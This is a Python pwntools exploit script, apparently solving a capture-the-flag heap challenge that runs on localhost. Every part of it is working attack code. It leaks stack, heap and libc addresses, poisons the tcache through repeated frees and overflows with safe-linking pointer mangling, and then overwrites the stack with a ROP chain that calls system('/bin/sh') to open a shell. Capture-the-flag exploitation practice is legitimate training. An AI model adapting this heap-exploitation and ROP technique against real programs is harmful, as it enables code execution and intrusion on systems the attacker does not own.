#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'localhost', 2001

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# b *add_note+115
# b *solve+269
# b *solve+318
# breakrva 0x0000000000001618
'''.format(**locals())

def add_note(data, overflow=False, data_overflow=None):
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', data)
    if overflow:
        io.sendlineafter(b'add?', b'yes\x00')
        io.sendlineafter(b'>>', data_overflow)
    else:
        io.sendlineafter(b'add?', b'no\x00')

def view_note():
    io.sendlineafter(b'>>', b'2')
    
def free_note():
    io.sendlineafter(b'>>', b'3')
    
def exitt(real_exit=False, data=None):
    io.sendlineafter(b'>>', b'4')
    if real_exit:
        io.sendlineafter(b'>>', b'yyes\x00')
    else:
        io.sendlineafter(b'>>', data)

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    add_note(b'A'*7)
    view_note()

    io.recvlines(2)

    stack_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    add_note(b'B'*0x10, False)
    add_note(b'C'*0x17, False)
    view_note()

    io.recvlines(2)
    heap_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    heap_base = heap_leak - 0x2c0
    free_note()

    for _ in range(39):
        add_note(b'D'*7 + b'\x00')

    exitt(False, cyclic(25) + p64(heap_base + 0x310))
    free_note()

    add_note(b'E'*7 + b'\x00', overflow=True, data_overflow=b'F'*0x18 + p64(0x4a1))

    exitt(False, cyclic(25) + p64(heap_base + 0x330))
    free_note()

    exitt(False, cyclic(25) + p64(heap_base + 0x330))
    view_note()

    io.recvline()
    libc_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = libc_leak - libc.sym['main_arena'] - 96

    for _ in range(9):
        add_note(b'G'*7)

    exitt(False, cyclic(25) + p64(heap_base + 0x480))
    free_note()
    
    exitt(False, cyclic(25) + p64(heap_base + 0x480 - 0x30))
    free_note()
    
    exitt(False, cyclic(25) + p64(heap_base + 0x480 - 0x30 - 0x30))
    free_note()
    
    exitt(False, cyclic(25) + p64(heap_base + 0x480 - 0x30 - 0x30 - 0x30))
    free_note()
    
    exitt(False, cyclic(25) + p64(heap_base + 0x480 - 0x30 - 0x30 - 0x30 - 0x30))
    free_note()
    
    exitt(False, cyclic(25) + p64(heap_base + 0x480 - 0x30 - 0x30 - 0x30 - 0x30 - 0x30))
    free_note()
    
    exitt(False, cyclic(25) + p64(heap_base + 0x480 - 0x30 - 0x30 - 0x30 - 0x30 - 0x30 - 0x30))
    free_note()
    
    exitt(False, cyclic(25) + p64(heap_base + 0x480 - 0x30 - 0x30 - 0x30 - 0x30 - 0x30 - 0x30 - 0x30))
    free_note()
    
    exitt(False, cyclic(25) + p64(heap_base + 0x2e0))
    free_note()
    
    exitt(False, cyclic(25) + p64(heap_base + 0x330))
    free_note()

    for _ in range(7):
        add_note(b'H'*7)

    add_note(b'I'*7, overflow=True, data_overflow=p64(mangle(heap_base + 0x2e0, stack_leak)))
    add_note(b'J'*7)
    add_note(b'K'*7)
    
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    add_note(b'L'*7, overflow=True, data_overflow=b'A'*8 + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.sym['system']))
    exitt(True)

    info(f'Stack leak: {hex(stack_leak)}')
    info(f'Heap leak: {hex(heap_leak)}')
    info(f'Libc leak: {hex(libc_leak)}')
    success(f'Heap base: {hex(heap_base)}')
    success(f'Libc base: {hex(libc.address)}')
    warning(f'Target {hex(stack_leak)}')
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()
